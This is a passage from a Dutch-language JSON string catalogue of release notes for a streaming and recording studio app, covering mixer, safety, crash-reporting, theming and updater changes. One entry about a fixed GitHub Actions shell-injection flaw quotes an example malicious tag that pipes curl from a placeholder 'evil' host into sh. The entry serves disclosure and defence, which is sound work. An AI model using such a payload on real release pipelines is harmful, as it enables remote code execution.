blijft. De basis voor scoreborden en lower thirds, zonder dienst. De OBS-importer zet nu ook „lezen uit bestand” om.","changelog.99703cca8970":"<strong>Een sneltoetsenkaart</strong> (CAP-M14). Eén doorzoekbare, filterbare tabel van <strong>elke</strong> koppeling — globale acties en push-to-talk/push-to-mute per bron — met eerlijke conflictsignalen: hetzelfde akkoord dat op twee manieren is geschreven, wordt als gedeeld gemarkeerd, en een toets die het besturingssysteem weigerde te registreren (in gebruik door een andere app, of niet beschikbaar in deze compositor) zegt dat. Exporteert een spiekbriefje in Markdown naar Downloads. Instellingen → Sneltoetsen koppelt; dit controleert en documenteert.","changelog.ee68b38bf053":"<strong>Een complete mixer: pannen, solo, mono</strong> (CAP-M19). Stereo<strong>balans</strong> per kanaal (het midden is bit voor bit gelijk aan geen panning), <strong>PFL-solo</strong> (de monitor hoort alleen de kanalen die op solo staan — de programmamix verandert nooit) en per bron <strong>mono-downmix</strong>.","changelog.7ab38b03302e":"<strong>Deïnterlacing voor apparaatbronnen</strong> (CAP-M17). Per apparaat discard / bob / lineair / blend / bewegingsadaptief (in de klasse van yadif) met keuze van de veldvolgorde — puur op de CPU in de opnamethread, op elk besturingssysteem gelijk. Een andere modus kiezen start het apparaat opnieuw, net als een formaatwijziging.","changelog.10b030797364":"<strong>Camerabediening met profielen per apparaat</strong> (CAP-M18). Belichting, witbalans, focus, zoom, versterking (en meer) voor webcams en capture-kaarten via één pad voor alle platforms — UVC via de eigen API's op Windows/Linux; macOS toont wat AVFoundation meldt, en dat is vaak niets, wat het paneel eerlijk zegt. Elke aanpassing wordt opgeslagen in een profiel per apparaat dat bij opnieuw aansluiten en herstarten opnieuw wordt toegepast.","changelog.1d38d97fe470":"[0.98.0] — 2026-07-12 (Uitzendveiligheid &amp; betrouwbaarheid — CAP-M reeks 2)","changelog.4b98f0291de5":"De tweede reeks must-haves: <em>verlies de show niet</em>. De studio vangt storingen nu op voordat je live gaat (een checklist vooraf), terwijl je live bent (altijd actieve veiligheidsalarmen, encoder-failover midden in de sessie, een dashboard met de status van bronnen) en nadat het ergste is gebeurd (opnames die een crash overleven, met reparatie bij de volgende start, en een beveiliging bij afsluiten die alles in de juiste volgorde afrondt). En als je alles <em>nu meteen</em> moet verbergen, is er een paniekknop.","changelog.f4de38fb000e":"<strong>Sjablonen voor bestandsnamen van opnames</strong> (CAP-M25). Naamgeving met tokens — <code>{prefix}</code>, <code>{date}</code>, <code>{time}</code>, <code>{scene}</code>, <code>{profile}</code>, <code>{canvas}</code>, <code>{marker-count}</code> en een bewaarde <code>{counter}</code> — voor opnames, opgeslagen replays en stilstaande beelden, met automatische achtervoegsels die botsingen voorkomen en <strong>mappen per uitvoer</strong> voor replays en stilstaande beelden. Namen worden ontdaan van de gereserveerde tekens van elk platform; een typefout in een sjabloon wordt bij het opslaan opgemerkt.","changelog.4750f9f5b2ce":"<strong>Een dashboard met de status van bronnen</strong> (CAP-M13). Eén paneel, te openen via het palet, met de livestatus van elke bron, fps, <strong>leeftijd van het laatste frame</strong>, het aantal verloren frames en de herstartgeschiedenis — plus Herstarten en Eigenschappen per bron. Bronnen die de engine niet draait, staan eerlijk op „inactief”.","changelog.977c064d0ab7":"<strong>Een beveiliging bij afsluiten + ordelijk afsluiten</strong> (CAP-M23). Als je de studio sluit terwijl je live bent, opneemt of de replay geactiveerd is, wordt het eerst gevraagd — met precies wat er gaat gebeuren — en daarna wordt de stream beëindigd, de opname afgerond en de replaybuffer weggeschreven, <strong>in die volgorde</strong>, voordat de app sluit. Een crashmarkeerbestand onderscheidt nu nette afsluitingen van crashes.","changelog.6102d929f559":"<strong>Opnames die een crash overleven + een aanbod om te redden</strong> (CAP-M11). Opnames in mp4/mov worden <strong>gefragmenteerd</strong> geschreven (een index per keyframe weggeschreven), dus een crash of stroomstoring laat een afspeelbaar bestand achter in plaats van een onleesbaar bestand. Als een sessie midden in een opname onverwacht stopt, biedt de volgende start een <strong>herstel</strong> in één klik naar een <code>(repaired)</code>-kopie — het origineel wordt nooit aangeraakt.","changelog.9d1b1cce6db8":"<strong>Encoder-failover midden in de sessie</strong> (CAP-M12). Als de hardware-encoder midden in een stream of opname vastloopt (driverreset, concurrentie om de GPU), schakelt de sessie tijdens het draaien een ladder af — de andere hardwarefamilie, daarna x264 — in plaats van te sterven. De stream gebruikt zijn bestaande herverbinding; de opname gaat verder in een nieuw bestand; een eerlijke melding + een blijvende notitie in het statistiekendock zeggen precies wat er gebeurde. Netwerkstoringen leiden nooit tot een wissel.","changelog.08f429a15748":"<strong>Veiligheidsalarmen voor de uitzending</strong> (CAP-M10). Altijd actieve waakhonden zolang er uitvoer loopt: <strong>stil programmageluid</strong>, <strong>aanhoudende oversturing</strong>, een <strong>zwart of bevroren programmabeeld</strong> (klassieke beeldverwerking — bemonsterde luma + framedelta over de bestaande readback, geen ML) en een <strong>voorspelling van weinig schijfruimte</strong> („nog ~22 min bij de huidige bitrate”). Niet-modaal: een banner die je kunt wegklikken + de aankondiger voor schermlezers.","changelog.a76206a6a95f":"<strong>Een paniekknop</strong> (CAP-M22). Eén globale sneltoets zet het programma (en het verticale canvas, en eventuele projectoren) over op een instelbaar privacyscherm, stopt elke opname van bronnen en dempt alle audio hard — de microfoon wordt niet eens meer opgenomen — terwijl de stream en de opname doorlopen. Terugzetten is een bewuste bevestiging in twee stappen.","changelog.0df040fc21b0":"<strong>Een opgeschoond diagnosepakket</strong> (CAP-M24). „Diagnostiek exporteren” schrijft een zip (momentopname van de configuratie, controle van encoders/apparaten, recente statistieken, het laatste crashrapport), samengesteld via een strikte <strong>toegestane lijst</strong> — streamsleutels, wachtwoorden, tokens, bestandspaden en tekst van de gebruiker worden nooit gelezen, laat staan opgenomen. Je kunt de exacte inhoud lezen voordat je exporteert; er wordt nooit iets ergens heen gestuurd.","changelog.4047624f0a67":"<strong>Een checklist vóór het live gaan</strong> (CAP-M09). Ga live voert nu eerst de controles uit: bestemmingen hebben een sleutel, de encoder is bruikbaar, bronnen zijn gezond, er is genoeg schijfruimte — elk groen/rood met een oplossing in één klik — plus eerlijke hints over de meting van microfoon- en bureaubladgeluid en de replaybuffer. Een optionele instelling houdt Ga live tegen totdat elke blokkerende controle groen is.","changelog.f0bd6b1eb67e":"Opnames in mp4/mov zijn overgestapt van de index aan het eind schrijven (<code>+faststart</code>) naar gefragmenteerd schrijven; de reparatie bij het redden (of Hermuxen) maakt een klassiek faststart-bestand als een editor daarop staat.","changelog.e2f271c14a12":"De validator <code>HotkeySettings</code> begrenst nu ook de sneltoetsen voor stilstaand beeld vastleggen en de paniekknop.","changelog.d236ab9ba3fe":"[0.97.0] — 2026-07-11 (Scènes bouwen &amp; bewaken — CAP-M reeks 1)","changelog.4b1bad38a6e8":"De eerste van de drie reeksen must-haves op weg naar 1.0.0. De compositor leert <em>bewerkt</em> te worden als een studio, niet alleen bestuurd: een geschiedenis voor ongedaan maken achter elke scènebewerking, meervoudige selectie met uitlijnen en verdelen en hulplijnen die je uittrekt, precieze transformaties die je tussen items kunt kopiëren, en een keying-werkbank die je de matte laat zien. En hij leert <em>bekeken</em> te worden: een multiview van elke scène, projectoren op volledig scherm voor elke scène / bron / programma / voorbeeld op elk beeldscherm, en stilstaand beeld verliesvrij vastleggen met één toets. Ten slotte opent hij zich voor de wereld waar hij vandaan kwam — een OBS-scèneverzameling importeren, en media terugvinden die zijn verplaatst.","changelog.7219ebda2472":"<strong>Ongedaan maken/opnieuw in meerdere stappen voor elke scènebewerking</strong> (CAP-M01). Een begrensde geschiedenis van momentopnamen met labels loopt onder hetzelfde slot als de verzameling; een doorlopend gebaar (slepen, een fader verschuiven) wordt één stap; <code>Ctrl</code>/<code>Cmd</code>+<code>Z</code> draait bewerkingen terug — nooit de live show (de programmascène kiezen, de weergave centreren en de focus blijven buiten de stapel). Een geschiedenislijst die je kunt bekijken, toont precies wat elke stap ongedaan maakt.","changelog.aae31a6bbe7f":"<strong>Een importer voor OBS-scèneverzamelingen</strong> (CAP-M02). Wijs hem een OBS-<code>scenes.json</code> aan en hij zet de scènes om, de z-volgorde, zichtbaarheid/vergrendeling/menging per item, kleur-, tekst-, afbeeldings- en mediabronnen, opnames van beeldscherm, venster, camera en audio, geneste scènes, en de video- <strong>en</strong> audiofilters die hij herkent — en geeft daarna een <strong>eerlijk rapport per bron</strong>: wat schoon is overgekomen, waarvoor het opnameapparaat opnieuw moet worden gekozen, wat naar een bestand verwijst dat je moet controleren, en wat geen equivalent had en is overgeslagen. Groottes en posities van items worden afgeleid uit de indeling van OBS (een scènebestand bevat geen eigen bronafmetingen en geen canvas), en dat staat in het rapport.","changelog.d6bb32be4ef4":"<strong>Een dokter voor ontbrekende bestanden</strong> (CAP-M03). Bij het laden — of op verzoek vanuit het palet — doorzoekt hij de verzameling op paden naar afbeeldingen / media / lettertypen / LUT's / maskers die niet meer kloppen, en biedt hij aan elk opnieuw te koppelen. Eén kapot pad repareren herstelt elke scène die het gebruikte; „Zoeken in map…” koppelt in één keer op naam.","changelog.6f96fd6fdf78":"<strong>Uitlijnen krijgt volledige meervoudige selectie</strong> (CAP-M04). Shift-klik en een selectierechthoek selecteren veel items; sleep een ervan om de groep te verplaatsen (uitgelijnd als één vak); lijn hun randen/middelpunten op elkaar uit of verdeel ze gelijkmatig. En je kunt je eigen <strong>hulplijnen</strong> uittrekken — sleep om te verplaatsen, sleep van het canvas af om te verwijderen — waarop gesleepte items uitlijnen, getekend over zowel het JPEG- als het eigen GPU-voorbeeld.","changelog.13b73aeb27b0":"<strong>Een paneel voor precieze transformaties met kopiëren/plakken</strong> (CAP-M05). Typ de positie ten opzichte van het ankerpunt, de grootte, de rotatie en de bijsnijding van een item; kopieer een transformatie of een hele filterketen en plak die op een ander item als één stap voor ongedaan maken.","changelog.5b8587772325":"<strong>Een keying-werkbank</strong> (CAP-M26). Stem een chroma-, kleur- of luma-key af op een live weergave van één bron met een mattemodus (alfa → grijs), een pipet, een loep en een versleepbare voor/na-splitsing.","changelog.630487ce7411":"<strong>Een multiview-monitor</strong> (CAP-M06) — een live raster van elke scène met rode (programma) / groene (voorbeeld) tally; klik om te snijden of (in Studiomodus) klaar te zetten. Hij kan als eigen venster op elk beeldscherm worden geopend.","changelog.cfb92d0b5e04":"<strong>Projectoren voor alles, overal</strong> (CAP-M07) — zet het programma, het voorbeeld van Studiomodus, een <strong>specifieke scène</strong> of een <strong>enkele bron</strong> op volledig scherm op elk aangesloten beeldscherm (of in een zwevend venster). Projectoren openen bij de volgende start weer waar je ze liet.","changelog.d31889806a32":"<strong>Stilstaand beeld vastleggen met één toets</strong> (CAP-M08) — een verliesvrije PNG van het programma (of van één bron, vóór of na de filters) in de opnamemap, te koppelen aan een globale sneltoets.","changelog.77c37009de86":"Scèneselectie is nu overal in het voorbeeld een volwaardige meervoudige selectie; een gebundelde transformatie legt uitlijnen / verdelen / groepsverplaatsingen vast als één stap voor ongedaan maken.","changelog.f1cc3f1d7724":"De <code>preview://</code>-pijp kreeg projectorslots op volle resolutie per doel en projectorrouting per scène, naast de bestaande slots voor programma / voorbeeld / verticaal / werkbank / multiview; CORS blijft vastgepind op de eigen origins van de app.","changelog.e27bd21b1216":"[0.96.0] — 2026-07-10 (Toegankelijkheid, 18 talen, eerste start &amp; thema's)","changelog.dfb83dff1086":"Fase 9: de afwerking voor de lancering. De studio spreekt nu achttien talen, is volledig met het toetsenbord te bedienen en hoorbaar voor een schermlezer, stelt zichzelf in bij de eerste start en kan een licht thema krijgen.","changelog.ed8d27bca3a0":"Twee van de bugs hieronder zouden in 1.0.0 zijn meegekomen en verdienen het om genoemd te worden, omdat ze allebei onzichtbaar waren bij de review en nu allebei worden afgedwongen door een lint of een test in plaats van door het geheugen. Het lichte thema was maar half gerepareerd — de donkere modus ziet er perfect uit, of een onderdeel nu een lichte override heeft of niet, dus wit-op-wit-knoppen komen elke keer door de codereview. En upgraden vanaf 0.95.1 zou de wizard voor de eerste start opnieuw hebben gestart, waarvan het startsjabloon een tweede beeldschermopname toevoegt aan de scène die een bestaande gebruiker al had ingericht.","changelog.245328562168":"<strong>De studio spreekt 18 talen</strong> (TASK-902) — <code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, uit een Fluent-catalogus van <strong>989 sleutels</strong>. Een verse installatie volgt de taal van het besturingssysteem; een uitdrukkelijke keuze gaat voor. Arabisch zet <code>&lt;html dir=&quot;rtl&quot;&gt;</code>. Engels ligt onder elke taal, dus een sleutel die een vertaler nog niet heeft bereikt, verschijnt in het Engels in plaats van als ruwe id. <code>npm run i18n:lint</code> laat CI falen bij een ontbrekende sleutel, een verweesde sleutel, een duplicaat of een <code>t(&quot;…&quot;)</code> die naar niets verwijst.","changelog.c9eb7215afcc":"Een pariteitslint bewijst dat de 18 catalogi <em>met elkaar</em> overeenkomen; het zegt niets over de vraag of de strings van de app erin staan. Drie extra poorten dichten dat gat: een test dat elke regel van een labeltabel wordt gevonden, een scan naar sleutels waar niets naar verwijst, en een scan naar <code>t()</code> die op moduleniveau wordt aangeroepen — wat een string zou bevriezen in de taal die bij het importeren geladen was, zonder hem ooit opnieuw te vertalen.","changelog.060a09e005da":"<strong>Een wizard voor de eerste start die de machine instelt waarop hij echt draait</strong> (TASK-903, TASK-905). Hij somt de GPU's en fysieke kernen op, rangschikt de beschikbare hardware-encoders en stelt een encoder, canvas, fps en bitrate voor, <em>met de reden in de taal van de gebruiker</em>. Een encoder die de driver al heeft geweigerd, wordt overgeslagen in plaats van aanbevolen. Accepteren is één klik; je instellingen houden ook. Overslaan telt als afronden — de wizard komt nooit terug.","changelog.62ba4a6d41af":"<strong>Een opdrachtenpalet</strong> onder <code>Ctrl</code>/<code>Cmd</code>+<code>K</code> (TASK-904), dat op deelreeksen zoekt, zodat <code>ssc</code> „Start Screen Capture” vindt.","changelog.925da222cab8":"<strong>Eén venster Instellingen en een pagina Over</strong> (TASK-906, TASK-907) — taal, thema en het statistiekendock op de ene plek; versie, buildgegevens, licenties en de bugmelder op de andere.","changelog.bece666d04b9":"<strong>Lichte en aangepaste thema's.</strong> De accentkleur is een CSS-custom-property die aan beide kanten van de IPC-grens als <code>#rrggbb</code> wordt gevalideerd, omdat een string die in een stylesheet wordt geschreven een plek voor injectie is.","changelog.dd70fb65720c":"<strong>De studio is nu te bedienen zonder muis of beeldscherm</strong> (TASK-901). Elke toetsenbordstop tekent een zichtbare focusring; dialoogvensters houden <code>Tab</code> vast en geven de focus terug waar ze die vandaan haalden; <code>aria-modal</code> wordt nu ondersteund door een echte focusval in plaats van een belofte. Live gaan, opnemen, opnieuw verbinden en een seconde video kwijtraken door verloren frames worden via een <code>aria-live</code>-gebied aan schermlezers gemeld. De instelling „beweging verminderen” van het besturingssysteem wordt gerespecteerd.","changelog.ff6f0dc97e11":"<strong>Upgraden start de wizard voor de eerste start niet meer opnieuw.</strong> <code>completedOnboarding</code> is nieuw, en een ontbrekende sleutel staat standaard op <code>false</code>, dus elke bestaande installatie zou zijn begroet door een wizard waarvan het startsjabloon een <em>tweede</em> beeldschermopname toevoegt boven op de scène die de gebruiker al had ingericht. Instellingenbestanden worden nu bij het laden gemigreerd: een bestand dat ouder is dan het veld maar al een EULA heeft geaccepteerd, is duidelijk al eerder gebruikt. Gebaseerd op het <em>ontbreken</em> van het veld, niet op een onware waarde — wie halverwege de wizard afsluit, schreef bewust <code>false</code> en moet hem opnieuw zien.","changelog.5cf1579964ec":"<strong>Het lichte thema geeft geen wit op wit meer weer.</strong> Panelen worden getekend met doorschijnend <em>wit</em> over bijna-zwart, en een CSS-variabele kan niet binnen een utility-klasse als <code>bg-white/10</code> komen, dus het lichte thema kleurt die klassenamen opnieuw met doorschijnend zwart. Zes waren gemist: de dempen/gate-chips van de mixer, de REC-badge, de banen van de voortgangsbalken voor downloads, statuschips, de stip „beëindigd” in het statistiekendock en de lijn van het citaatblok in de EULA. <code>npm run theme:lint</code> laat CI nu falen bij elke utility met witte alfa die geen lichte override heeft en geen regel in de toegestane lijst die zegt waarom hij wit mag blijven.","changelog.b78b64a1e1a5":"<strong>Een accentkleur kiezen gooit een gebruiker van het lichte thema niet meer in het donker.</strong> Het kleurstaal dwong het thema naar Aangepast, zodat het vanuit elke modus „werkte”, maar Aangepast is gebaseerd op donker — één tikje aan de kleur gooide Licht stilletjes weg. Het kleurstaal is nu buiten Aangepast uitgeschakeld.","changelog.7d0190596194":"<strong>Schermlezers melden niet meer bij elke herverbinding een reeks verloren frames.</strong> Het aantal verloren frames is cumulatief en blijft tijdens een storing oplopen, dus de eerste statusupdate na terugkeer in de uitzending vergeleek met de basiswaarde van vóór de storing en meldde de hele storing als een nieuwe reeks — boven op de meldingen „opnieuw verbinden” en „live” die de luisteraar al had gehoord.","changelog.a83950358bea":"<strong>Een mislukte opslag van instellingen gooit geen ongerelateerde instelling meer weg.</strong> Het terugdraaien zette de hele momentopname van de instellingen terug die bij het tonen van het dialoogvenster was gemaakt, dus een mislukte opslag kon een <em>andere</em> instelling ongedaan maken die in de tussentijd wel was gelukt. De opslag wordt nu opnieuw ingelezen.","changelog.aac84f9f1108":"<strong><code>.frec</code>-opnames hebben nu een eigen pictogram in Verkenner.</strong> Het <code>fileAssociations</code>-schema van Tauri heeft geen <code>icon</code>-veld en de NSIS-sjabloon zet de <code>DefaultIcon</code> van de koppeling vast op het uitvoerbare bestand van de app, dus elke opname toonde het pictogram van de studio terwijl <code>icons/frec.ico</code> ongebruikt in de installatiemap stond. Een <code>NSIS_HOOK_POSTINSTALL</code>-hook herschrijft de <code>DefaultIcon</code> van de ProgId nadat de koppeling is geschreven, en stuurt <code>SHCNE_ASSOCCHANGED</code>, zodat Verkenner zonder afmelden opnieuw tekent. <em>(Windows; de macOS-<code>.icns</code> en de MSI-bundel tonen nog het pictogram van de app — aparte vervolgstappen.)</em> Let op: de koppeling wordt geregistreerd door het <strong>installatieprogramma</strong>, dus een <code>.frec</code> toont het algemene pictogram totdat Freally Capture is geïnstalleerd in plaats van vanuit een buildmap gestart.","changelog.64cdb0e5fc96":"[0.95.1] — 2026-07-09 (Crashmeldingen, blijvende EULA &amp; reparaties aan dialoogvensters)","changelog.ec29332c27cd":"Zes bugs, gevonden bij het oefenen van de bugmeldingsstroom op echte hardware — waarvan er twee in 1.0.0 zouden zijn meegekomen — plus het werk aan crashmeldingen en de updater dat die oefeningen vroegen. Een crash vertelt je nu dat hij gebeurde en brengt de studio terug met het rapport al geopend.","changelog.a70a547d08ad":"<strong>Een crash vertelt je nu dat hij gebeurde, en brengt de studio terug.</strong> Een app die sterft, kan zijn eigen foutvenster niet tonen, dus de panic-hook start hetzelfde uitvoerbare bestand als een piepkleine helper zonder Tauri (<code>--crash-notice &lt;pid&gt;</code>), die een eigen dialoogvenster „Freally Capture is onverwacht gestopt” toont, wacht tot het gecrashte proces uit de procestabel is verdwenen, en de app opnieuw start. De heropende studio toont het opgeschoonde rapport automatisch. Dat wachten is essentieel: opnieuw starten terwijl het restant nog het slot voor één instantie vasthoudt, vouwt de nieuwe start in de stervende app en laat helemaal geen studio achter.","changelog.71da0a3520ee":"<strong>De EULA accepteren draait zichzelf niet meer terug.</strong> <code>App.tsx</code> leest de instellingen <em>en</em> de EULA-status bij het mounten, dus de momentopname van de instellingen is van vóór de acceptatie; elke instelling wijzigen in diezelfde sessie schreef de verouderde <code>acceptedEulaVersion: null</code> eroverheen en de poort kwam bij de volgende start terug. Een profiel dat vóór de acceptatie was opgeslagen, deed hetzelfde. <code>SettingsStore::set()</code> behoudt het veld nu en <code>accept_eula()</code> is de enige die het schrijft.","changelog.327bad332e86":"<strong>Dialoogvensters zaten opgesloten in hun dock.</strong> De <code>backdrop-blur</code> van <code>Panel</code> maakt het tot het omvattende blok voor <code>position: fixed</code>, dus de overlay van <code>PickerShell</code> centreerde zich binnen het vak van het dock in plaats van het venster — 16 van de 19 dialoogvensters, waaronder <em>Controleren op updates</em>, werden deels buiten beeld weergegeven, met knoppen die je niet kon bereiken. <code>PickerShell</code> gebruikt nu een portal naar <code>document.body</code>.","changelog.05a8d823f564":"<strong>Crashrapporten per e-mail openden stilletjes niets.</strong> De lengte van de URL werd begrensd op aantal tekens, maar percent-encoding blaast een teken van 3 bytes negen keer op — een echte backtrace leverde een <code>mailto:</code> van ~7800 tekens op, voorbij de grens van ~2048 van ShellExecute in Windows, wat een leeg venster opent en geen fout meldt. De grens geldt nu voor de <strong>hele URL</strong> (schema, adres, onderwerp en tekst samen), afgedwongen op de gecodeerde lengte, en inkorten splitst nooit een escape. Alleen de tekst begrenzen was niet genoeg: een onderwerp is tekst van de gebruiker, en 80 CJK-tekens worden 720 bytes, dus een niet-Engels rapport kwam nog steeds op ~2285 tekens.","changelog.b0d9792ddddb":"<strong>Twee gelijktijdige panics toonden twee crashdialoogvensters.</strong> <code>panic = &quot;abort&quot;</code> zet de wereld niet direct stil, dus twee threads konden elk de hook uitvoeren. De melding wordt nu maximaal één keer per proces gestart.","changelog.6747e7604c73":"<strong>Een crashmeldingshelper zonder leesbare pid startte de app meteen opnieuw</strong>, recht in de race om de enkele instantie die hij juist moet vermijden. Hij wacht nu in plaats daarvan een vaste tijd.","changelog.c52ec7fca94b":"<strong>Vervolgkeuzemenu's bleven open als je ernaast klikte.</strong> Het menu <strong>+</strong> van de bronnenrail en beide menu's <em>Filter toevoegen</em> sluiten nu bij een klik erbuiten of met Escape. Escape sluit alleen het binnenste element, dus een menu in een dialoogvenster sluit je met één druk en het dialoogvenster met een tweede.","changelog.ceb3ac683c32":"<strong>Opstellen in Gmail</strong> naast de bestaande knop voor de mailclient — gewoon https, geen API-sleutel, niets wordt automatisch verstuurd; een afgemelde gebruiker komt bij het inlogscherm van Google en keert daarna terug naar het vooraf ingevulde concept.","changelog.3ed3900cea6b":"<strong>Crashrapporten vermelden het tijdstip waarop ze gebeurden</strong>, in de lokale tijd van de gebruiker met de UTC-verschuiving en in UTC. De verschuiving is licht identificerend en is gedocumenteerd als de enige bewuste uitzondering op de regel „geen persoonsgegevens” van het rapport; de gebruiker leest de exacte tekst voordat hij die verstuurt.","changelog.2757df14a536":"<strong>De studio controleert bij het starten één keer op updates</strong> en toont de nieuwe versie, het nummer en de release-opmerkingen uit dit bestand in een alleen-lezenveld, met een uitdrukkelijk ja/nee. Een openstaand crashrapport krijgt altijd voorrang in het dialoogvenster; de update wacht dan tot de volgende start. Controles offline of bij een snelheidslimiet blijven stil. <code>latest.json</code> bevat nu de sectie van de versie uit <code>CHANGELOG.md</code> als <code>notes</code>.","changelog.0ceef8bf9dbd":"Updates op Windows draaien nu de NSIS-wizard (<code>installMode: basicUi</code>), zodat de laatste pagina <strong>Freally Capture starten</strong> en een selectievakje voor een snelkoppeling op het bureaublad aanbiedt, in plaats van stil opnieuw te starten. Het installatieprogramma heeft ook het pictogram van de app (<code>nsis.installerIcon</code>) in plaats van het standaardpictogram van NSIS.","changelog.04d1725214c0":"De sectie <strong>Testen</strong> van het dialoogvenster voor bugmeldingen (<em>Crashrapport simuleren</em>, <em>Testcrash forceren</em>) en de twee bijbehorende IPC-opdrachten. Een knop „laat de app crashen” hoort niet thuis in een studio waarmee live wordt uitgezonden; de stroom wordt geoefend met de startvlag <code>--test-crash</code>, waar geen knop en geen opdracht achter zitten.","changelog.6bd81d475bf0":"<strong>Releaseworkflow: shell-injectie via de tagnaam.</strong> <code>${{ github.ref_name }}</code> werd rechtstreeks in <code>run:</code>-blokken ingevoegd, dus GitHub plakte de tag in de shell*broncode* voordat bash die verwerkte. Ref-namen verbieden spaties maar staan <code>&quot;</code>, <code>;</code>, <code>$</code> en backticks toe, en <code>${IFS}</code> levert de spatie — een tag als <code>v1&quot;;curl${IFS}evil|sh;&quot;</code> zou worden uitgevoerd. De tag bereikt het script nu via <code>env:</code>, als gegevens. Misbruik vereiste rechten om tags te pushen, dus dit is verdediging in de diepte.","changelog.81cccf7322b4":"De <code>actions/checkout</code> van de releasetaak zet nu <code>persist-credentials: false</code>. De taak heeft <code>contents: write</code> en leest alleen <code>CHANGELOG.md</code>; het laten staan van de <code>GITHUB_TOKEN</code> in <code>.git/config</code> zou elke toekomstige injectie een kant-en-klare weg hebben gegeven om te pushen.","changelog.25ca7c7f85dd":"<code>PRIVACY.md</code> zegt nu duidelijk dat de controle op updates <strong>één keer per start</strong> draait in plaats van alleen op verzoek, en dat er niets over de gebruiker wordt verstuurd — de vorige formulering zei dat elk netwerkverzoek „door jouw handeling werd gestart”, wat door de nieuwe controle bij het starten niet meer klopte.","changelog.46a767ffc1f9":"[0.95.0] — 2026-07-08 (Game-opname, distributie &amp; geluid per app — fase 8)","changelog.599aa55a76f0":"Ondertekende, zelf gehoste automatische updates, audio-opname per applicatie, een koppelvlak voor de NDI-runtime, een koppelvlak voor game-opname dat het anti-cheatrisico eerlijk benoemt, een EULA-poort bij de eerste start, en video in de stream voor reacties en recensies — de onderdelen van fase 8 „op weg naar 1.0.0”, allemaal lokaal en standaard uit.","changelog.5903d686ccbb":"Toegevoegd — fase 8","changelog.eb682bb7ec7d":"<strong>Ondertekende, zelf gehoste automatische updater</strong> (TASK-803) — de app controleert een ondertekende <code>latest.json</code> op het eindpunt voor GitHub-releases en controleert elke download tegen een minisign-publieke sleutel die in het programma is ingebakken voordat die wordt toegepast (een niet-ondertekend of gemanipuleerd pakket wordt geweigerd). <strong>⭳ Controleren op updates…</strong> in het dock Bediening — er wordt niets gedownload zonder een klik; de app start opnieuw om af te ronden. De releasepipeline ondertekent elk artefact en stelt <code>latest.json</code> samen; macOS Developer-ID + notarisatie is aangesloten en wacht op geheimen (upgrade naar een betaald certificaat, geen wijziging in de workflow). Zie <code>design/updater-signing.md</code>.","changelog.883b1ffbdb75":"<strong>Audio-opname per applicatie</strong> (TASK-805) — neem het geluid van één app op als eigen mixerbron. Eerst op Windows via WASAPI-<strong>procesloopback</strong> (<code>ActivateAudioInterfaceAsync</code> op het virtuele procesloopbackapparaat, Win10 2004+); de COM-<code>unsafe</code> is geïsoleerd in de nieuwe crate <code>fcap-appaudio</code>, zodat <code>fcap-audio</code> <code>#![forbid(unsafe_code)]</code> blijft. Het krijgt een volledig mixerkanaal (VU, fader, dempen, monitoring, filters, spoor). Linux/macOS tonen de eerlijke uitleg per besturingssysteem. Bronnen ▸ <strong>Applicatiegeluid</strong>.","changelog.56b6b2b908a6":"<strong>Koppelvlak voor game-opname + eerlijke waarschuwing voor anti-cheat/antivirus</strong> (TASK-801) — „Game-opname” (een DX/GL/Vulkan-hook injecteren) is een opt-in, <strong>gemarkeerde mijlpaal</strong>: de app injecteert nooit stilletjes en toont het <strong>risico op een ban</strong> door anti-cheat + het antivirusrisico vóór elke hook. De weg die vandaag werkt — <strong>Vensteropname</strong> (randloos/in venster) — wordt per besturingssysteem aanbevolen (Wayland → de portal). Bronnen ▸ <strong>Spelopname (lees eerst)</strong>.","changelog.ec03a805ba49":"<strong>Koppelvlak voor de NDI-runtime</strong> (TASK-804) — optionele NDI-uitvoer herkent een door de gebruiker geïnstalleerde NDI-runtime (nooit meegeleverd) via de gedocumenteerde omgevingsvariabelen + standaardmappen en test of die te linken is; de getypeerde uitvoervlag hangt af van die herkenning. Frames versturen bindt aan de gratis headers van de NDI SDK (een benoemde vervolgstap). Alleen-lezen zichtbaar in Componenten ▸ <strong>Optionele integraties</strong>.","changelog.eaa0871281d1":"<strong>EULA-acceptatiepoort bij de eerste start</strong> — de studio wordt pas weergegeven als de huidige EULA-versie is geaccepteerd (scrollen om te lezen, <strong>Ik ga akkoord</strong> / <strong>Weigeren &amp; afsluiten</strong>); de acceptatie wordt bewaard en er wordt alleen opnieuw gevraagd als de EULA-versie verandert. <code>EULA.md</code> wordt bij het bouwen ingesloten, zodat de geaccepteerde tekst precies is wat er wordt geleverd.","changelog.52426b69775a":"<strong>Video in de stream (reacties/recensies)</strong> — sluit een video in de scène in en <strong>pauzeer en hervat hem live</strong> terwijl je eroverheen praat, en haal hem daarna weg — het geluid van de mediabron pauzeert en hervat samen met het beeld in de mix (⏸/▶ op mediabronnen).","changelog.082d1c8d5bec":"<strong>Componenten downloaden in de app</strong> — de download van ffmpeg op aanvraag toont nu een duidelijk percentage zoals <code>98.35%</code> naast de voortgangsbalk + annuleren. Een nieuw onderdeel <strong>Browserbron-runtime (Chromium/CEF)</strong> downloadt de CEF-runtime van ~100 MB op dezelfde eerlijke manier: het zoekt de nieuwste stabiele build op in de officiële CEF-buildindex, <strong>controleert de download tegen de SHA-1 uit die index voordat hij wordt uitgepakt</strong> (niets meegeleverd, geen vastgelegde hash) en slaat hem per gebruiker op — met dezelfde UI met %/balk/annuleren. De browser*bron* die via de runtime wordt weergegeven, is een eigen vervolgmijlpaal; deze versie levert de download van de runtime.","changelog.1dc8ae2f6900":"Eerlijk afgebakend (fase 8)","changelog.158788627266":"<strong>VST2/3</strong> (TASK-804) — uitgesteld achter een vlag: de VST2 SDK wordt niet meer door Steinberg gelicentieerd en VST3 is GPLv3 of propriëtair, en beide botsen met een build van $0 zonder extra licentie. De eigen set DSP-filters (ruisonderdrukking, gate, compressor, limiter, EQ, versterking, ducking) is het meegeleverde alternatief.","changelog.c436d24d7e3a":"<strong>Injectie van een GPU-hook voor game-opname</strong> en <strong>frames versturen via NDI</strong> zijn de benoemde vervolgmijlpalen waarvoor de koppelvlakken hierboven stabiel zijn.","changelog.8843550dc6eb":"[0.90.0] — 2026-07-08 (Bediening op afstand, scripts &amp; plug-ins — de uitbreidbaarheid)","changelog.a7f6a66abff0":"Bestuur de studio vanaf een Stream Deck, reageer met een script op het live gaan, sluit een chatdock in en breid de app uit met een plug-in — de uitbreidbaarheid van fase 7, allemaal <strong>lokaal en standaard uit</strong>.","changelog.3f14c1391b04":"Toegevoegd — 